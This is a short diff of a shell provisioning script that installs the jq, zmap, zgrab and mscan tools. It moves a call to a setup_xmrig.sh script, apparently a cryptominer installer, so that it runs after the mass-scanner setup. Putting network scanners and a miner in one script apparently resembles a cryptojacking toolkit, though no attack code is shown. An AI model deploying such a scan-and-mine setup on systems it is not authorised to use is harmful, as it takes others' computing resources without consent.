@@ -13,9 +13,9 @@ function INIT_MAIN(){
     SETUP_JQ
     SETUP_ZMAP
     SETUP_ZGRAB
-    /usr/local/bin/setup_xmrig.sh
-    # Assuming SETUP_MSCAN is needed
     SETUP_MSCAN
+    /usr/local/bin/setup_xmrig.sh
+
 }
 
 SETUP_BASICS() {
@@ -85,7 +85,6 @@ function SETUP_ZGRAB(){
     make
     cp ./zgrab /usr/bin/zgrab
     rm -rf /var/cache/apk/*
-    /usr/local/bin/setup_xmrig.sh
 }
 
 function SETUP_MSCAN(){
